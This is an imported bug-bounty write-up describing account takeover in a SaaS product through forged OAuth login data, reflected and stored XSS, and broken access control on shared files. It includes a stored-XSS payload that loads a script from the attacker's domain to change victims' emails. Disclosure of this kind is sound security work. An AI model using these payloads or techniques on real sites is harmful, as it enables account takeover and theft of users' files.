---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-27_how-i-hacked-a-target-again-and-again.md
original_filename: 2021-05-27_how-i-hacked-a-target-again-and-again.md
title: How I hacked a Target again and again…
category: documents
detected_topics:
- xss
- access-control
- oauth
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- access-control
- oauth
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: a11df30683f068a1ac9e38c88191278e9193a5313ba86eb93baf36332ba04c8f
text_sha256: e94adac9849870128c7b5d3fb630a249fd730f05c2d54e8948583914748bea67
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked a Target again and again…

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-27_how-i-hacked-a-target-again-and-again.md
- Source Type: markdown
- Detected Topics: xss, access-control, oauth, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `a11df30683f068a1ac9e38c88191278e9193a5313ba86eb93baf36332ba04c8f`
- Text SHA256: `e94adac9849870128c7b5d3fb630a249fd730f05c2d54e8948583914748bea67`


## Content

---
title: "How I hacked a Target again and again…"
url: "https://cirius.medium.com/how-i-hacked-a-target-again-and-again-6db2e462221f"
authors: ["Aditya Verma (@0cirius0)"]
bugs: ["OAuth", "Account takeover", "XSS", "Broken Access Control"]
publication_date: "2021-05-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3620
scraped_via: "browseros"
---

# How I hacked a Target again and again…

How I hacked a Target again and again…
Aditya Verma
Follow
4 min read
·
May 26, 2021

385

1

This all started with a when I was hunting on a private program; I found a few subdomains of almost similar UI and requests but different title. To access the subdomain login was required with no sign of creating an account. I tried injection and other basic things. When I tried for Host Header Injection, I saw a similar approach made by all those subdomains to redirect to the particular host if it exists or default back to the website(whose service was running on these subdomains). This gave out the product running and luckily they were also running Bug Bounty Program, so from a private VDP I found a public BBP. So,here it goes…

OAUTH Login

Since this was a product based company which provided it’s product to other companies, they also gave out trial product. I registered an account and started testing. The webapp allowed login using OAUTH providers(Google,Facebook,etc). I had already an admin account on the webapp and now I tried to login to that account using Facebook. I went on with the OAUTH process and then started looking at all the requests made by the browser. I noticed that after logging in to facebook a request is made to /sociallogin/[service:DATA,name:DATA,email:DATA,etc . After this if the email is registered with any account then the user gets logged in to that account. Now, the thing here is that, there was no check to see if the email in the request is the same which facebook has provided after login. That means even if I change the email and then request to same endpoint manually then also I would get logged in.

This is interesting okay then what about this, if the email is not registered to any account then the user would be redirected to another endpoint /forcesignup/DETAILS which would create an account with admin privileges in the webapp.

I also tried triggering the account creation by directly visiting the forcesignup endpoint but that didn’t work out. Doesn’t matter as I can create admin account by just visting the previous endpoint. They fixed this bug by adding a signature parameter along with other details in the /sociallogin/ endpoint which made sure that the data in the request cannot be forged.

XSS

Get Aditya Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now I was looking for any other broken access control by using autorize in burpsuite with simple user cookies and browsing the web-app with admin cookies. I found a option to upload files only present for admin. The uploaded files could also be viewed within the webapp. On clicking to view the file browser made several requests with unique identifier for the file to be viewed. One of the endpoint in these requests was taking unique identifier through the URL and then was reflecting it back inside script tag. Moreover, if you pass any invalid identifier then also it would reflect back inside script tag and the page was accessible by anyone.Although, since the identifier if invalid no file will be loaded to view, but who wants to view file when we have got XSS. There were some issues in passing some special characters through the URL and I was not able to close the script tag, so instead I used JQuery within the script tag to call for another script using $.getScript(“My_server”). Now, I created a script to change the email of user so that I can escalate this to Account Takeover.

Attacking Scenario: A attacker could get the endpoint from his own trial account and then change his trial-account subdomain to victim account to make the attack work on victim subdomain and then he can change the email of administrator account of victim subdomain just by a click of the victim subdomain’s admin.

Broken Access Control

The administrator had also the option to share the uploaded files with users. After a file was shared to a user the URL for viewing the file looked like https://trial.domain.com/user/files/id:5 . Here, if the admin uploaded 5 files and shared fifth file then the above URL would be the one for user.Now, if I change the ID from 5 to 4 then although the page didn’t show the file but it displayed the name of file. And by uploading several files, I came to conclusion that the files were uploaded on the CDN as https://CDN_domain/fakepath/file_name+EPOCH . Although, CDN URL also contained some signature and key-pair but the files were accessible even without them.So, a simple user can view all the files uploaded by admin just by visiting the https://trial.domain.com/user/files/id:5, getting the name of file and then bruteforcing the EPOCH, which would be way too easy if the file shared was uploaded together with other files(as in this case epoch wouldn’t differ much).

Another XSS:

The web-app allowed users to interact among groups by creating a discussion. I tried basic HTML injection on the comments of discussion and it went in. Then, I tried bsaic XSS payloads but of no use. Ran intruder to create comments with wordlist from portswigger for all event attributes with h1 tag. Although most of the event attributes were blocked but onpointerup,onpointerdown, and similar onpointer attributes were not blocked and opened the possibility for XSS. Used the following payload to exploit the issue with my previous script to change victim user’s email.

<h1 onpointerup=$.getScript(“mydomain_url”)>Hello</h1>

Stored XSS which would change the email of every user who visits the discussion.

There were some other bugs and bypasses to previous bugs which I had found on the same program but I guess this post has become enough long.
